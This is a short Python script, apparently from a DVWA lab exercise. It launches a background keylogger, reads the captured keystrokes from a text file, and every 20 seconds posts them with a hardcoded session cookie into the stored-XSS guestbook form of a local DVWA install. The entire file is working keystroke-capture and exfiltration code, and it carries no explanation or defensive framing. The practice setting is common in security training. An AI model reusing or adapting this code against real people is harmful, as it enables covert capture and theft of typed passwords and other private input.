#!/usr/bin/env python3

import requests
import time
import os
from pynput.keyboard import Listener

startlog = time.time()

os.system('python3 keyloggerRemote.py &')
time.sleep(1)

def send_request():
    cookies = {'PHPSESSID':'j1p183dj1i4fc1989vcjc92ugr','security':'low'} 
    url='http://127.0.0.1/dvwa/vulnerabilities/xss_s' 
    form_input = open("keyboard_Input.txt") 
    form_send = form_input.read() 
    form_data = {'txtName':'Vader', 'mtxMessage':f"'{form_send}'", 'btnSign':'Sign+Guestbook'}   
    r = requests.post(url, cookies=cookies, data=form_data) 

def interval():
	global startlog
	if time.time() - 20 > startlog:
		print("it's been 20 secs")
		send_request()
		startlog = time.time()

counter = 0
while True:
	counter += 1
	print(counter)
	interval()
	time.sleep(1)
